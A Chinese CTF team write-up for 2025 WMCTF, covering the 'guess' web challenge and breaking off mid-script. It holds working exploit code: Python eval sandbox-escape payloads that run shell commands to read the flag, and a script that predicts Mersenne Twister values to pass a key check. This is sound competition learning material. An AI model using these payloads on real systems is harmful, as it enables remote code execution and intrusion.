<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2025 WMCTF SU WriteUp - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="感谢 W&amp;amp;M 的师傅们精心准备的比赛！本次 WMCTF 我们 SU 取得了第二名🥈 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 WMCTF的 WriteUp。"><meta property="og:type" content="blog"><meta property="og:title" content="2025 WMCTF SU WriteUp"><meta property="og:url" content="https://team-su.github.io/posts/f7c5eeeb.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="感谢 W&amp;amp;M 的师傅们精心准备的比赛！本次 WMCTF 我们 SU 取得了第二名🥈 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 WMCTF的 WriteUp。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/1.PNG"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/2.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/3.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/4.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/5.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/6.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/7.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/8.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/9.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/10.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/11.png"><meta property="og:image" content="https://team-su.github.io/images/2025-WMCTF/12.png"><meta property="article:published_time" content="2025-09-21T11:32:48.000Z"><meta property="article:modified_time" content="2025-09-21T14:20:57.518Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="WMCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2025-WMCTF/1.PNG"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/f7c5eeeb.html"},"headline":"2025 WMCTF SU WriteUp","image":["https://team-su.github.io/images/2025-WMCTF/2.png","https://team-su.github.io/images/2025-WMCTF/3.png","https://team-su.github.io/images/2025-WMCTF/4.png","https://team-su.github.io/images/2025-WMCTF/5.png","https://team-su.github.io/images/2025-WMCTF/6.png","https://team-su.github.io/images/2025-WMCTF/7.png","https://team-su.github.io/images/2025-WMCTF/8.png","https://team-su.github.io/images/2025-WMCTF/9.png","https://team-su.github.io/images/2025-WMCTF/10.png","https://team-su.github.io/images/2025-WMCTF/11.png","https://team-su.github.io/images/2025-WMCTF/12.png"],"datePublished":"2025-09-21T11:32:48.000Z","dateModified":"2025-09-21T14:20:57.518Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"感谢 W&amp;M 的师傅们精心准备的比赛！本次 WMCTF 我们 SU 取得了第二名🥈 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 WMCTF的 WriteUp。"}</script><link rel="canonical" href="https://team-su.github.io/posts/f7c5eeeb.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2025-09-21T11:32:48.000Z" title="2025/9/21 19:32:48">2025-09-21</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-09-21T14:20:57.518Z" title="2025/9/21 22:20:57">2025-09-21</time></span><span class="level-item">an hour read (About 8734 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2025 WMCTF SU WriteUp</h1><div class="content"><p>感谢 W&amp;M 的师傅们精心准备的比赛！本次 WMCTF 我们 SU 取得了第二名🥈 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#101;&#x72;&#115;&#95;&#120;&#99;&#116;&#102;&#x40;&#x31;&#50;&#x36;&#46;&#x63;&#x6f;&#x6d;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 本次 2025 WMCTF的 WriteUp。</p>
<p><img src="../images/2025-WMCTF/1.PNG" alt="img"></p>
<span id="more"></span>

<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#guess">guess</a></li>
<li><a href="#pdf2text">pdf2text</a></li>
</ul>
</li>
<li><a href="#reverse">Reverse</a><ul>
<li><a href="#catfriend">catfriend</a></li>
<li><a href="#appfriend">appfriend</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#check-in">Check in</a></li>
<li><a href="#questionnaire">Questionnaire</a></li>
<li><a href="#shopping-company1">Shopping company1</a></li>
<li><a href="#shopping-company3">Shopping company3</a></li>
<li><a href="#shopping-company2">Shopping company2</a></li>
<li><a href="#phishing-email">phishing email</a></li>
<li><a href="#voice-hacker">Voice_hacker</a></li>
</ul>
</li>
<li><a href="#crypto">CRYPTO</a><ul>
<li><a href="#splitmaster">SplitMaster</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="guess">guess</span><a href="#guess" class="header-anchor"></a></h2><p>应用代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session, render_template, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">rd = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(rd.getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_string()</span><br><span class="line"></span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">a = generate_random_string()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(user[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">for</span> user <span class="keyword">in</span> users):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username already exists&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    user_id = generate_random_string()</span><br><span class="line">    </span><br><span class="line">    users.append(&#123;</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;User registered successfully&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id</span><br><span class="line">    &#125;), <span class="number">201</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> users <span class="keyword">if</span> user[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> user[<span class="string">&#x27;password&#x27;</span>] == password), <span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid credentials&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">    </span><br><span class="line">    session[<span class="string">&#x27;user_id&#x27;</span>] = user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Login successful&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    &#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected_api</span>():</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line"></span><br><span class="line">    key1 = data.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> key1:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;key are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    key2 = generate_random_string()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(key1) == <span class="built_in">str</span>(key2):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Not Allowed:&#x27;</span> + <span class="built_in">str</span>(key2) ,</span><br><span class="line">        &#125;), <span class="number">403</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    payload = data.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="built_in">eval</span>(payload, &#123;<span class="string">&#x27;__builtin__&#x27;</span>:&#123;&#125;&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Access granted&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5001</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>过了key2就可以直接RCE了，不出网，先创建静态文件夹</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3345821131&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(lambda o: o.mkdir(&#x27;static&#x27;))(next(c.__init__.__globals__[&#x27;os&#x27;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#x27;__globals__&#x27;) and &#x27;os&#x27; in c.__init__.__globals__))&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>再写入文件</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3345821131&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(lambda o: open(&#x27;static/out.txt&#x27;,&#x27;w&#x27;).write(o.popen(&#x27;whoami&#x27;).read()))(next(c.__init__.__globals__[&#x27;os&#x27;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#x27;__globals__&#x27;) and &#x27;os&#x27; in c.__init__.__globals__))&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>由于需要预测随机数，所以直接一次性payload会比较好</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5001</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;140&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;, &quot;Google Chrome&quot;;v=&quot;140&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-scilab">&#123;</span></span><br><span class="line"><span class="language-scilab">  <span class="string">&quot;key&quot;</span>: <span class="string">&quot;3345821131&quot;</span>,</span></span><br><span class="line"><span class="language-scilab">  <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;(lambda o: [o.mkdir(&#x27;</span>static&#x27;), open(<span class="string">&#x27;static/out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(o.popen(<span class="string">&#x27;tac /flag&#x27;</span>).read())])(next(c.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>] <span class="keyword">for</span> c in ().__class__.__base__.__subclasses__() <span class="keyword">if</span> hasattr(c.__init__,<span class="string">&#x27;__globals__&#x27;</span>) <span class="built_in">and</span> <span class="string">&#x27;os&#x27;</span> in c.__init__.__globals__))<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-scilab">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>让写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://49.232.42.74:30222&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    username = <span class="string">&quot;testuser1&quot;</span></span><br><span class="line">    password = <span class="string">&quot;testuser1&quot;</span></span><br><span class="line"></span><br><span class="line">    register_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/register&quot;</span>, json=register_data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">201</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;注册失败: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    user_id = r.json()[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;注册成功，user_id: <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/login&quot;</span>, json=login_data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;登录失败: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    random_numbers = [<span class="built_in">int</span>(user_id)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>):</span><br><span class="line">        data = &#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">        r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/api&quot;</span>, json=data)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">403</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;收集随机数失败: <span class="subst">&#123;r.status_code&#125;</span> <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        key2 = r.json()[<span class="string">&#x27;message&#x27;</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        random_numbers.append(<span class="built_in">int</span>(key2))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;收集到第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>个随机数: <span class="subst">&#123;key2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rc = RandCrack()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> random_numbers:</span><br><span class="line">        rc.submit(num)</span><br><span class="line">    next_rand = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;预测的下一个随机数: <span class="subst">&#123;next_rand&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;next(c.__init__.__globals__[&#x27;os&#x27;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#x27;__globals__&#x27;) and &#x27;os&#x27; in c.__init__.__globals__).popen(&#x27;mkdir -p static &amp;&amp; tac /flag &gt; static/out.txt&#x27;).read()&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;key&quot;</span>: <span class="built_in">str</span>(next_rand), <span class="string">&quot;payload&quot;</span>: payload&#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/api&quot;</span>, json=data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Payload执行成功&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span 